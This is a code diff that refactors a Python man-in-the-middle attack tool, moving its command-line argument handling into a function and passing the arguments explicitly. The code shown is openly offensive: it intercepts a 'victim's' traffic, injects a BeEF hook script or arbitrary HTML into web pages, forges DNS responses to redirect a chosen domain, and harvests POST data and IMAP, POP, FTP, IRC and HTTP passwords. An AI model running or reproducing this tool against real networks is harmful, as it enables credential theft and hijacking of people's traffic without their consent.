@@ -45,25 +45,28 @@ from zlib import decompressobj, decompress
 import gzip
 from cStringIO import StringIO
 
-#Create the arguments
-parser = argparse.ArgumentParser()
-parser.add_argument("-b", "--beef", help="Inject a BeEF hook URL. Example usage: -b http://192.168.0.3:3000/hook.js")
-parser.add_argument("-c", "--code", help="Inject arbitrary html. Example usage (include quotes): -c '<title>New title</title>'")
-parser.add_argument("-u", "--urlspy", help="Show all URLs and search terms the victim visits or enters minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -v to print all URLs and without truncation.", action="store_true")
-parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning which would give you a list of possible targets. Usage: -ip <victim IP>")
-parser.add_argument("-vmac", "--victimmac", help="Set the victim MAC; by default the script will attempt a few different ways of getting this so this option hopefully won't be necessary")
-parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
-parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits but doesn't limit the URL to 150 characters like -u does.", action="store_true")
-parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument. An argument like [facebook.com] will match all subdomains of facebook.com")
-parser.add_argument("-set", "--setoolkit", help="Start Social Engineer's Toolkit in another window.", action="store_true")
-parser.add_argument("-p", "--post", help="Print unsecured HTTP POST loads, IMAP/POP/FTP/IRC/HTTP usernames/passwords and incoming/outgoing emails. Will also decode base64 encrypted POP/IMAP username/password combos for you.", action="store_true")
-parser.add_argument("-na", "--nmapaggressive", help="Aggressively scan the target for open ports and services in the background. Output to ip.add.re.ss.log.txt where ip.add.re.ss is the victim's IP.", action="store_true")
-parser.add_argument("-n", "--nmap", help="Scan the target for open ports prior to starting to sniffing their packets.", action="store_true")
-parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`.")
-parser.add_argument("-rip", "--routerip", help="Set the router IP; by default the script with attempt a few different ways of getting this so this option hopefully won't be necessary")
-parser.add_argument("-rmac", "--routermac", help="Set the router MAC; by default the script with attempt a few different ways of getting this so this option hopefully won't be necessary")
-parser.add_argument("-pcap", "--pcap", help="Parse through a pcap file")
-args = parser.parse_args()
+def parse_args():
+	#Create the arguments
+	parser = argparse.ArgumentParser()
+	
+	parser.add_argument("-b", "--beef", help="Inject a BeEF hook URL. Example usage: -b http://192.168.0.3:3000/hook.js")
+	parser.add_argument("-c", "--code", help="Inject arbitrary html. Example usage (include quotes): -c '<title>New title</title>'")
+	parser.add_argument("-u", "--urlspy", help="Show all URLs and search terms the victim visits or enters minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -v to print all URLs and without truncation.", action="store_true")
+	parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning which would give you a list of possible targets. Usage: -ip <victim IP>")
+	parser.add_argument("-vmac", "--victimmac", help="Set the victim MAC; by default the script will attempt a few different ways of getting this so this option hopefully won't be necessary")
+	parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
+	parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits but doesn't limit the URL to 150 characters like -u does.", action="store_true")
+	parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument. An argument like [facebook.com] will match all subdomains of facebook.com")
+	parser.add_argument("-set", "--setoolkit", help="Start Social Engineer's Toolkit in another window.", action="store_true")
+	parser.add_argument("-p", "--post", help="Print unsecured HTTP POST loads, IMAP/POP/FTP/IRC/HTTP usernames/passwords and incoming/outgoing emails. Will also decode base64 encrypted POP/IMAP username/password combos for you.", action="store_true")
+	parser.add_argument("-na", "--nmapaggressive", help="Aggressively scan the target for open ports and services in the background. Output to ip.add.re.ss.log.txt where ip.add.re.ss is the victim's IP.", action="store_true")
+	parser.add_argument("-n", "--nmap", help="Scan the target for open ports prior to starting to sniffing their packets.", action="store_true")
+	parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`.")
+	parser.add_argument("-rip", "--routerip", help="Set the router IP; by default the script with attempt a few different ways of getting this so this option hopefully won't be necessary")
+	parser.add_argument("-rmac", "--routermac", help="Set the router MAC; by default the script with attempt a few different ways of getting this so this option hopefully won't be necessary")
+	parser.add_argument("-pcap", "--pcap", help="Parse through a pcap file")
+	
+	return parser.parse_args()
 
 #Console colors
 W  = '\033[0m'  # white (normal)
@@ -118,9 +121,12 @@ class Parser():
 	html_url = ''
 	user_agent = None
 
+	def __init__(self, args):
+		self.args = args
+
 	def start(self, payload):
-		if args.pcap:
-			if args.ipaddress:
+		if self.args.pcap:
+			if self.args.ipaddress:
 				try:
 					pkt = payload[IP]
 				except:
@@ -134,7 +140,7 @@ class Parser():
 		IP_layer = pkt[IP]
 		IP_dst = pkt[IP].dst
 		IP_src = pkt[IP].src
-		if args.urlspy or args.post or args.beef or args.code:
+		if self.args.urlspy or self.args.post or self.args.beef or self.args.code:
 			if pkt.haslayer(Raw):
 				if pkt.haslayer(TCP):
 					dport = pkt[TCP].dport
@@ -151,9 +157,9 @@ class Parser():
 						self.ftp(load, IP_dst, IP_src)
 					if dport == 80 or sport == 80:
 						self.http_parser(load, ack, dport)
-						if args.beef or args.code:
+						if self.args.beef or self.args.code:
 							self.injecthtml(load, ack, pkt, payload, dport, sport)
-		if args.dnsspoof:
+		if self.args.dnsspoof:
 			if pkt.haslayer(DNSQR):
 				dport = pkt[UDP].dport
 				sport = pkt[UDP].sport
@@ -175,10 +181,10 @@ class Parser():
 				return
 
 		ack = str(ack)
-		if args.beef:
-			bhtml = '<script src='+args.beef+'></script>'
-		if args.code:
-			chtml = args.code
+		if self.args.beef:
+			bhtml = '<script src='+self.args.beef+'></script>'
+		if self.args.code:
+			chtml = self.args.code
 
 		try:
 			headers, body = load.split("\r\n\r\n", 1)
@@ -227,7 +233,7 @@ class Parser():
 			f.close
 
 			# INJECT
-			if args.beef:
+			if self.args.beef:
 				if '<html' in body or '/html>' in body:
 					try:
 						psplit = body.split('</head>', 1)
@@ -237,13 +243,13 @@ class Parser():
 							psplit = body.split('<head>', 1)
 							body = psplit[0]+'<head>'+bhtml+psplit[1]
 						except:
-							if not args.code:
+							if not self.args.code:
 								self.html_url = None
 								payload.set_verdict(nfqueue.NF_ACCEPT)
 								return
 							else:
 								pass
-			if args.code:
+			if self.args.code:
 				if '<html' in body or '/html>' in body:
 					try:
 						psplit = body.split('<head>', 1)
@@ -414,11 +420,11 @@ class Parser():
 		# print urls
 		if url:
 			#Print the URL
-			if args.verboseURL:
+			if self.args.verboseURL:
 				print '[*] '+url
 				logger.write('[*] '+url+'\n')
 
-			if args.urlspy:
+			if self.args.urlspy:
 				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
 				if any(i in url for i in d):
 					return
@@ -433,7 +439,7 @@ class Parser():
 			self.searches(url, host)
 
 			#Print POST load and find cookies
-			if args.post and post:
+			if self.args.post and post:
 				self.post_parser(url, body, host, header_lines)
 
 	def ftp(self, load, IP_dst, IP_src):
@@ -450,7 +456,7 @@ class Parser():
 
 	def irc(self, load, dport, sport, IP_src):
 			load = repr(load)[1:-1].split(r"\r\n")
-			if args.post:
+			if self.args.post:
 				if IP_src == victimIP:
 					if 'NICK ' in load[0]:
 						self.IRCnick = load[0].split('NICK ')[1]
@@ -681,15 +687,15 @@ class Parser():
 
 	# Spoof DNS for a specific domain to point to your machine
 	def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, localIP, payload):
-		if args.dnsspoof:
-			if args.dnsspoof in dns_layer.qd.qname:
-				logger.write('[+] DNS request for '+args.dnsspoof+' found; dropping packet and injecting spoofed one to '+localIP+'\n')
+		if self.args.dnsspoof:
+			if self.args.dnsspoof in dns_layer.qd.qname:
+				logger.write('[+] DNS request for '+self.args.dnsspoof+' found; dropping packet and injecting spoofed one to '+localIP+'\n')
 				payload.set_verdict(nfqueue.NF_DROP)
 				logger.write('[+] Dropped real DNS response. Injecting the spoofed packet sending victim to '+localIP+'\n')
 				p = IP(dst=IP_src, src=IP_dst)/UDP(dport=sport, sport=dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=localIP))
 				send(p)
-				print G+'[!] Sent spoofed packet for '+W+args.dnsspoof
-				logger.write('[!] Sent spoofed packet for '+args.dnsspoof+'\n')
+				print G+'[!] Sent spoofed packet for '+W+self.args.dnsspoof
+				logger.write('[!] Sent spoofed packet for '+self.args.dnsspoof+'\n')
 
 #Wrap the nfqueue object in an IReadDescriptor and run the process_pending function in a .doRead() of the twisted IReadDescriptor
 class Queued(object):
@@ -841,7 +847,7 @@ def setup(victimMAC):
 	os.system('/sbin/iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
 
 # Start threads
-def threads():
+def threads(args):
 
 	rt = Thread(target=reactor.run, args=(False,)) #reactor must be started without signal handling since it's not in the main thread
 	rt.daemon = True
@@ -881,7 +887,7 @@ def threads():
 		except:
 			print '[-] Could not open SEToolkit, continuing without it.'
 
-def pcap_handler():
+def pcap_handler(args):
 	global victimIP
 	bad_args = [args.dnsspoof, args.beef, args.code, args.nmap, args.nmapaggressive, args.driftnet, args.interface]
 	for x in bad_args:
@@ -900,11 +906,11 @@ def pcap_handler():
 		sys.exit('[-] When reading from pcap file you may only include the following arguments: -v, -u, -p, -pcap [pcap filename], and -ip [victim IP address]')
 
 # Main loop
-def main():
+def main(args):
 	global victimIP, interface
 
 	if args.pcap:
-		pcap_handler()
+		pcap_handler(args)
 		sys.exit('[-] Finished parsing pcap file')
 
 	#Check if root
@@ -1020,7 +1026,7 @@ def main():
 
 	setup(victimMAC)
 	Queued()
-	threads()
+	threads(args)
 
 	if args.nmap:
 		print "\n[*] Running [nmap -T4 -O "+victimIP+"] this may take several minutes..."
@@ -1062,4 +1068,4 @@ def main():
 		time.sleep(1.5)
 
 if __name__ == "__main__":
-	main()
+	main(parse_args())
